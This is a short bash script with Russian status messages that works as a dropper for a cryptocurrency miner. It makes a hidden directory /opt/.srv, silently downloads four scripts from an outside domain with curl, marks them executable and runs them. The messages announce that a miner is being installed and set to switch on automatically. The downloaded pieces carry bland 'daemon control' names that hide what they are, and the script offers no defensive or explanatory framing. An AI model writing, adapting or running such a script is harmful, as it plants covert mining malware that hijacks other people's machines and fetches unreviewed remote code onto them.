#!/bin/bash
DOMAIN="service-timed.ct.ws"
echo "Скачиваем скрипты управления демонами..."
mkdir -p /opt/.srv
cd /opt/.srv
curl -s -L "http://$DOMAIN/daemon_control_install.sh" -o daemon_control_install.sh
curl -s -L "http://$DOMAIN/daemon_control_start.sh" -o daemon_control_start.sh
curl -s -L "http://$DOMAIN/daemon_control_stop.sh" -o daemon_control_stop.sh
curl -s -L "http://$DOMAIN/daemon_control_schedule.sh" -o daemon_control_schedule.sh
chmod +x *.sh
echo "Устанавливаем майнер..."
./daemon_control_install.sh
echo "Настраиваем автоматическое переключение..."
./daemon_control_schedule.sh
echo "Установка завершена!"
echo "Команды управления:"
echo "  /opt/.srv/daemon_control_start.sh  - запуск"
echo "  /opt/.srv/daemon_control_stop.sh   - остановка"
